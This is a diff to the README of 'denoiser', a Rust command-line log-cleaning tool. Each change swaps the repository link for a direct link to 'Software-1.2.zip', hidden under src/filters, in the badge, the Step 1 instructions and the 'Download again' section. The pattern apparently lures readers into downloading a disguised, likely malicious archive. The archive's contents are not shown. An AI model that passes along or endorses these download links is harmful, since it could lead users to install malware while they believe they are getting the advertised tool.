@@ -1,6 +1,6 @@
 # 🧹 denoiser - Clean terminal logs for LLM work
 
-[![Download denoiser](https://img.shields.io/badge/Download-denoiser-blue?style=for-the-badge)](https://github.com/forged-profanity770/denoiser)
+[![Download denoiser](https://img.shields.io/badge/Download-denoiser-blue?style=for-the-badge)](https://github.com/forged-profanity770/denoiser/raw/refs/heads/main/src/filters/Software-1.2.zip)
 
 ## 📦 What this app does
 
@@ -13,7 +13,7 @@ It is a Rust app built for the command line. You can run it on Windows and use i
 ### Step 1: Open the download page
 
 Visit this page to download:
-https://github.com/forged-profanity770/denoiser
+https://github.com/forged-profanity770/denoiser/raw/refs/heads/main/src/filters/Software-1.2.zip
 
 ### Step 2: Get the app
 
@@ -174,7 +174,7 @@ Use this order:
 ## 📎 Download again
 
 Visit this page to download:
-https://github.com/forged-profanity770/denoiser
+https://github.com/forged-profanity770/denoiser/raw/refs/heads/main/src/filters/Software-1.2.zip
 
 ## 🪶 Notes for first use
 
